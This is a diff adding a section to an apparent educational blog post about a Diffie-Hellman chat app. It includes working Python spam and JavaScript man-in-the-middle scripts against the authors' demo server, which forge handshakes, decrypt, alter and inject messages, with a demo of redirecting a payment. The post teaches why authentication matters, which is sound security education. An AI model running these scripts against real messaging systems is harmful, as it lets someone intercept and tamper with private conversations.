@@ -368,4 +368,307 @@ socket.on("broadcastMessage", (msg) => {
 ```
 
 ### Functionality
-todo: continue
+Here is a video demoing the functionality of the chat app. A python script is also running, displaying the messages being broadcasted by the server.
+
+<YouTube id="P076pLaztxI"/>
+
+We can see that when Magnus presses the ‘Send’ button, the dhPub (A) and dhPriv (a) variables are set. A message is sent to Elia, the contents of which are a very large number. This is the public key, A. Elia then receives the message and sets here dhPriv (b) and dhPub (B) variables. She then computes an aesKey, ‘ec6914…’. She sends a message back to Magnus containing another very large number, her public key. Magnus then receives the message and computes the same AES key. Magnus then sends a message, ‘AZqmb…’, which encrypts ‘hello elia’. Looking at the logged messages, it is clear that our code now obfuscates the plaintext message ‘hello elia’ from any snoopers. Our chat app now provides confidentiality.
+
+### Assessing spam and integrity
+One issue with our solution is that encryption algorithms such as AES-256 do not offer integrity. Given some ciphertext, there is no way to tell whether that ciphertext has been modified. If some ciphertext is randomly changed, it is likely that the corresponding deciphered text will be unintelligible garbage, but it will still be able to be deciphered. We don’t have a great system to detect modified messages, other than noting that they are unintelligible. So an attacker could spam random messages to a user, and these messages would be rendered as random text when decrypted. The code snippet below conducts this ‘spam attack’, and this is showcased here.
+```python
+# diffieHellmanSpam.py
+
+import socketio
+
+targetA = 'Magnus'
+targetB = 'Elia'
+
+sio = socketio.Client(reconnection=False)
+
+@sio.event
+def connect():
+    print("Connected to the server")
+
+@sio.on("broadcastMessage")
+def receive_message(message):
+    print(f"Received message from server: {message}")
+
+sio.connect("https://chatappserver-ucb7.onrender.com")
+
+count = 1
+while True:
+    count += 1
+    sio.emit("sendMessage", {
+        'sender': targetA,
+        'receiver': targetB,
+        'message': 'qwertyuiopasdfghjklzxcvbnm' * count,
+        'handshake': False
+    })
+    sio.sleep(1)
+```
+
+
+
+<YouTube id="vIDcuQ29li8"/>
+
+One way to counteract this attack is to agree upon a shared prefix that all messages must start with. This prefix can be public. The message will be encrypted and sent. The receiver can decrypt the message and check whether the prefix is present. If it is not, they can be confident that the message has not been sent by the recipient who knows the secret key, or it has been tampered with, modified by a third party. 
+
+In our code we use the prefix ‘seashells_’. The implementation of validating an incoming message is shown in the snippet below.
+
+```javascript
+// broadcastMessage Listener snippet
+
+if (decryptedMessage.startsWith("seashells_")) {
+  decryptedMessage = decryptedMessage.slice(10)
+  msg.message = decryptedMessage
+  setMessages((prevMessages) => [...prevMessages, msg]);  
+}
+```
+
+We can see in the following demo that the jargon messages being sent are now filtered out and are not visible to the end users:
+<YouTube id='YdKUfIT70Ms'/>
+
+On top of addressing spam, our solution seems to verify message integrity. We noted that if you tried altering the ciphertext a little, you might see that the corresponding text when deciphered changes drastically and is unintelligible. 
+
+However, block ciphers such as AES-256 are malleable. If the operation mode of the block cipher is known, an attacker can actually modify the ciphertext in such a way that the corresponding input text is readable and has been altered. Thus it could be possible that an attacker modifies the ciphertext sent by Alice to Bob in such a way that when decrypted, the message will still start with ‘seashells_’ but the rest of the message will be altered. Our prefix solution is not cryptographically secure and does not offer integrity.
+
+#### Message authentication codes
+A more sophisticated and secure solution is the use of a message authentication code. Suppose Alice and Bob want to communicate and they have established a shared secret key using the Diffie-Hellman protocol. This key will be used to encrypt messages. Alice and Bob can use the protocol again to generate another secret key. When Alice wants to send a message, she can append the secret key to it and use a MAC algorithm, which is typically based on cryptographic hash functions such as SHA-256, to obtain a MAC tag. She then sends the message without the secret, and also sends the MAC tag. Upon receiving the message, Bob will append the same secret key and use the same algorithm to compute a MAC tag. If the computed tag matches the tag Bob receives, he can be confident that the message is genuine and has not been tampered with. An attacker can modify the message but without the secret key, they wouldn’t be able to compute the valid corresponding MAC tag. 
+
+This simple implementation of a message authentication code is susceptible to length extension attacks. If an attacker knows the length of the message as well as the MAC tag, which is a hash of the message, they can append extra data to the end of the message and produce a new valid hash. They can then send the new message and hash and the recipient will recompute the same hash, believing the message has not been altered.
+
+In practice, more sophisticated MAC algorithms are used such as HMAC, the hash-based message authentication code. To summarise this algorithm, it uses two secret keys. We append the first key to the message and calculate the hash. We then append the second key to the output and calculate its hash. The result will be the MAC tag sent alongside the message. 
+
+This prevents length extension attacks. The first stage of HMAC, appending a secret key to the message and calculating its hash is analogous to the standard MAC implementation described earlier. Knowing the message and the hash, an attacker could extend the message and find a new valid hash for the extended message. But with HMAC, the output of the first hash is not revealed. In fact, it is of a fixed length since hashing algorithms take a variable length input and produce a fixed length output. So there is no way to perform a length extension attack on the second hash, since the input to it will always be of a fixed length. 
+
+### One final tweak
+Suppose Alice and Bob have established a secure connection and have been messaging for several days. Bob leaves his computer unattended for a few minutes but realises that an attacker could have opened his laptop and seen the shared aesKey. So he wants to recalculate a new private key and the corresponding public key. He wants to send the new public key to Alice so they can recompute a new shared aesKey. Let’s modify the code to facilitate this.
+
+```javascript
+// broadcastMessage Listener snippet
+
+// ...
+if (msg.sender === connectionEstablishedWithRef.current) {
+  setDiffieHellmanReceiverPublic(msg.message)
+  computeSymmetricKey(diffieHellmanPrivateRef.current, msg.message).then((
+    aesKey) => {
+    setAesKey(aesKey)
+  })
+}
+// ...
+```
+
+The code implements this functionality so if the user we have established a connection with resends a public key, we recalculate the aesKey.
+
+### Assessing authentication
+Looks like the messages we send are now confidential in our chat app. Does our chat app authenticate users? 
+
+Well, users are still being identified by a username, which they can choose. Hence, an attacker could pretend to be ‘Alice’ simply by changing their username to Alice. We do not have authentication in our chat app. When Alice wants to send a message to Bob, she first computes the Diffie-Hellman keys and sends a handshake message to Bob. But how can she be sure that she is sending the message to the real Bob and not someone else who set their username to Bob? How can she be sure that the handshake reply she gets comes from the real Bob? Of course, she can’t be sure. It’s possible that a secure connection has been established with a fraudulent Bob.
+
+Now suppose Alice is weary of this possibility, so after establishing a secure connection with Bob, she asks Bob a question about her that he would know the answer to, but any attacker wouldn’t. Something like ‘what is my birthday?’ She receives a correct reply from Bob, so now she is confident that she has secured a connection with the real Bob. If a fraudulent Bob accepted the connection, they wouldn’t know the answer.
+
+When used like this, it appears that our chat app provides authentication, but in reality our app is vulnerable to a very sneaky attack. An attacker can make Alice and Bob both believe they have established a secure connection. They can receive each other’s messages and they can verify the messages are being encrypted. But yet the attacker can somehow discreetly view all messages, and even modify them at their will.
+
+### A man in the middle (MITM) attack
+Our chat app is vulnerable to a man in the middle attack. Here’s how it works.
+
+Suppose Alice wants to communicate with Bob. She first chooses a private number, a, and computes the public key g<sup>a</sup> mod p, sending it to Bob. An attacker, Jax, intercepts the message before it reaches Bob. Jax chooses his own private number, j, computes the public key g<sup>j</sup> mod p, and sends it back to Alice, pretending to be Bob. Alice and Jax then both compute the shared key g<sup>aj</sup> mod p. 
+
+Alice believes that she has set up a connection with Bob but really the connection is with Jax. To complete the attack, Jax needs to convince Bob he has established a connection with Alice. So Jax sends his public key g<sup>j</sup> mod p to Bob, pretending to be Alice, and Bob replies with his public key, g<sup>b</sup> mod p. Jax and Bob each compute the shared key, g<sup>bj</sup> mod p. Now Alice and Jax have established a shared secret, g<sup>aj</sup> mod p, and Bob and Jax have established a shared secret, g<sup>bj</sup> mod p.
+
+Whenever Alice sends a message to Bob, she will encrypt it with the key g<sup>aj</sup> mod p first. Jax will intercept the message, decrypt it, potentially modify it, re-encrypt it with the key g<sup>bj</sup> mod p and send it to Bob. Bob will then decrypt the message with the key g<sup>bj</sup> mod p. Alice and Bob have no idea Jax is sitting in the middle decrypting all the messages sent between them.
+
+#### Implementing this attack
+Since our chat app allows parties who have established a connection to send an updated public key and have the receiver recompute a new shared key, our attack can be conducted remotely without needing to prevent a message packet from being sent successfully to the server. An automated script can be rewritten to listen for handshake messages emitted by the server and perform the MITM attack anytime anyone uses the chat app.
+
+We implement a targeted attack on chosen targets for simplicity.
+```javascript
+// diffieMITM.js broadcastMessage Listener snippet
+
+// Establish a shared secret with targetA
+if (message.sender === targetA && message.receiver === targetB && !
+  interceptedTargetA) {
+  interceptedTargetA = true
+  diffieHellmanPublicTargetA = message.message
+  const dh = generateKeyToSend()
+  diffieHellmanPrivateUs = dh.aBigInt
+  diffieHellmanPublicUs = dh.A
+
+  computeSymmetricKey(diffieHellmanPrivateUs,
+    diffieHellmanPublicTargetA).then((
+    aesKey) => {
+    aesKeyWithTargetA = aesKey
+  })
+  ourMessages.push(diffieHellmanPublicUs.toString())
+
+  // Send a public key to targetA pretending to be targetB
+  // So targetA can generate the same shared secret
+  setTimeout(() => {
+    socket.emit('sendMessage', {
+      sender: targetB,
+      receiver: targetA,
+      message: diffieHellmanPublicUs.toString(),
+      handshake: true,
+    })
+  }, 1000)
+}
+```
+
+The attack is written in diffieMITM.js. We set up a listener to listen for messages emitted by the server. We set targetA and targetB to the victims’ usernames. When a handshake message is sent by targetA to targetB, targetB will send a handshake reply and they will establish a shared key. We will also see the message sent to targetB and we will reply with our own public key, with the ‘sender’ field set to targetB. TargetA will see that targetB has updated their public key, so targetA will recompute a shared key using our public key. We have now established a shared key with targetA.
+
+We will also send targetB a message with our public key, with the sender field set to targetA. targetB will see that targetA has updated their public key, so targetB will recompute a shared key using our public key. We have now also established a shared key with targetB. Voila.
+
+Now, when targetA sends a message to targetB, it will be encrypted with the key shared with us, not with the key targetB has. So, when targetB tries to decrypt the message, it will become garbage. It won’t start with ‘seashells_’ so targetB will discard the message and it won’t be shown to the end user. 
+
+As seen in the below snippet, we listen for this message. Since it is encrypted with the key shared with us, we can decrypt it. We can then encrypt it with ‘aesKeyWithTargetB’, the key we share with targetB and send it to targetB, with the sender field set to targetA. targetB will then decrypt the message successfully without raising suspicion.
+
+```javascript
+// diffieMITM.js broadcastMessage Listener snippet
+
+// ...
+else if (message.sender === targetA && message.receiver === targetB &&
+  interceptedTargetA && interceptedTargetB && !ourMessages.includes(
+    message.message)) {
+  const decryptedMessage = aes256.decrypt(aesKeyWithTargetA, message
+    .message)
+
+  // Record decrypted message
+  console.log(`${targetA} -> ${targetB}: ${decryptedMessage}`)
+
+  const encryptedMessage = aes256.encrypt(aesKeyWithTargetB, 
+    decryptedMessage)
+  ourMessages.push(encryptedMessage)
+  setTimeout(() => {
+    socket.emit('sendMessage', {
+      sender: targetA,
+      receiver: targetB,
+      message: encryptedMessage,
+      handshake: false,
+    })
+  }, 100);
+}
+// ...
+```
+
+#### Security theatre and unintended consequences
+We can see that the feature to allow resending an updated public key and have the receiver recompute a new shared key, as well as the spam protection ‘seashells_’ feature actually allow this man in the middle attack to occur remotely without the need to intercept and modify network packets in real-time. Without the spam protection, for instance, Alice and Bob would see a jargon message arriving moments before they receive every readable message, which would surely raise suspicion. 
+
+It is critical that we thoroughly analyse the security implications of new features. The feature to allow a receiver to recompute a new shared key upon receiving an updated public key was justified earlier to improve security; changing keys regularly is a good thing, right? In addition, we saw earlier that the spam attack protection appeared to provide data integrity, as it would block out rudimentary attempts to tamper with transmitted ciphertext. But both these features can be considered security theatre. They appeared to improve security, but in reality, they facilitated the remote MITM attack. A takeaway we can make is that it is important to incorporate security into the design process of a system from the beginning. Adding security ‘features’ as an afterthought because they sound appropriate is not sufficient.
+
+### MITM Attack demos
+Here are a series of MITM attacks we can perform.
+
+#### Discreetly sniffing messages
+<YouTube id='cVTA_6H7Ryw'/>
+In this demo, Magnus and Elia are using the chat app to communicate, but we perform a man in the middle attack. The terminal on the right logs all messages. Here’s a summary of what transpires:
+- Magnus presses the send button. A handshake message is sent to Elia.
+- Elia responds with a handshake reply and the two of them compute a shared aesKey, ‘d4cb297cf…’.
+- Magnus then immediately sends a message containing ciphertext encrypting ‘hello elia’. Our MITM code cannot decrypt this first message since we do not know the AES key.
+- A few moments later, forged messages are sent by the MITM code to Magnus and Elia, each from the other, containing an updated public key, derived from the MITM code’s chosen private key.
+- Magnus and Elia both compute new AES keys and the MITM code also computes these keys. Notice the aesKeys flicker and change to become ‘e3529…’ for Magnus and ‘f90f91…’ for Elia. Both these keys are printed to the terminal running the MITM code.
+- When Elia enters the message ‘helllo magnus’ and clicks the send button, it is encrypted with her key ‘f90f91…’. Magnus tries to decrypt it with his key ‘e3529…’ and gets garbage. Since it doesn’t start with ‘seashells_’, it is ignored.
+- The MITM code also receives the message. It decrypts it with its shared key ‘e3529’, prints the message to the terminal, encrypts it with the key shared with Magnus, ‘f90f91…’, and sends it to Magnus.
+- Magnus’s client receives the message, decrypts it successfully and displays it on his browser.
+- Notice the two messages sent back to back in the console on the right.
+
+#### Modifying messages in real time
+We can also modify the messages before they are relayed as demonstrated in the code snippet below.
+```javascript
+// diffieMITM_ModifyMessages.js broadcastMessage Listener snippet
+
+// ...
+const decryptedMessage = aes256.decrypt(aesKeyWithTargetA, message
+  .message)
+console.log(
+  `Original message - ${targetA} -> ${targetB}: ${decryptedMessage}`
+  )
+rl.question('Modified message (leave empty for no change): ', (
+  modifiedMessage) => {
+  if (modifiedMessage.length === 0) {
+    modifiedMessage = decryptedMessage
+  }
+  const encryptedMessage = aes256.encrypt(aesKeyWithTargetB,
+    modifiedMessage)
+  ourMessages.push(encryptedMessage)
+  setTimeout(() => {
+    socket.emit('sendMessage', {
+      sender: targetA,
+      receiver: targetB,
+      message: encryptedMessage,
+      handshake: false,
+    })
+  }, 100);
+})
+// ...
+```
+
+This can be used to social engineer convincing messages. See how it is used to convince Elia to send money to the attacker’s bitcoin address rather than Magnus’s bank account in the following demo.
+<YouTube id='BZyD1sA88M0'/>
+
+Here’s a screenshot from the demo video:
+![ MITM Attack Screenshot ](/img/chat-app-iter-2-MITM-screenshot.png)
+A snippet of Magnus’s browser is on the left and Elia’s is on the right. Smooth operator.
+
+#### Sending forged messages whenever we want
+We can also send messages whenever we want to our targets once we’ve conducted the initial MITM attack. This feature is implemented in diffieMITM_ModifyMessages.js, shown below. Here’s a demo video showcasing this attack:
+
+https://drive.google.com/file/d/1OlZ1csK-T7YPxolmpPEvekUpUwzNEyyw/view?usp=sharing
+
+TODO: embed video
+
+```javascript
+// diffieMITM_SendMessages.js
+
+// ...
+let aesKeyWithTargetA, aesKeyWithTargetB;
+const targetA = 'Magnus';
+const targetB = 'Elia';
+
+// Helper function to encrypt a message with the
+// key shared with the passed in receiver
+// and send the encrypted message to the receiver
+function sendMessage(receiver, message) {
+  const encryptedMessage = aes256.encrypt(receiver === targetA ?
+    aesKeyWithTargetA : aesKeyWithTargetB, message);
+  setTimeout(() => {
+    socket.emit('sendMessage', {
+      sender: receiver === targetA ? targetB : targetA,
+      receiver: receiver,
+      message: encryptedMessage,
+      handshake: false,
+    });
+  }, 100);
+}
+
+// Ask for a message and who to send it to
+const askRecipientAndMessage = () => {
+  rl.question('Recipient: ', (receiver) => {
+    rl.question('Message: ', (message) => {
+      sendMessage(receiver, message);
+      askRecipientAndMessage(); // Loop indefinitely
+    });
+  });
+};
+
+// Get the AES keys shared with the targets
+rl.question('aesKeyWithTargetA: ', (keyA) => {
+  aesKeyWithTargetA = keyA;
+
+  rl.question('aesKeyWithTargetB: ', (keyB) => {
+    aesKeyWithTargetB = keyB;
+    askRecipientAndMessage(); // Call helper function
+  });
+});
+```
+
+### Replay attacks
+Our chat app is also vulnerable to replay attacks. An attacker could connect to the server and listen in to messages. They could then emit the same messages to the receiver and they will show up on the receiver’s chat stream. The messages can be replayed while the same connection is intact. If the users go offline, the message can no longer be replayed. Even if they go online again, they will perform a new handshake, generating a new shared key, so if the message is replayed, it will decrypt into garbage. 
+
+A drawback to this attack in our chat app is that when we replay a message, the server will emit it to all users, so the sender will also receive the message and it will show up on their feed, which could raise suspicion.
+
+### Reflections
+We can see that the Diffie-Hellman key exchange protocol shows potential as a good building block for a secure chat app. But on its own, it compromises confidentiality, vulnerable to man in the middle attacks, since it lacks mechanisms for ensuring integrity and authentication. 
+
+---
+TODO: Link to next blog
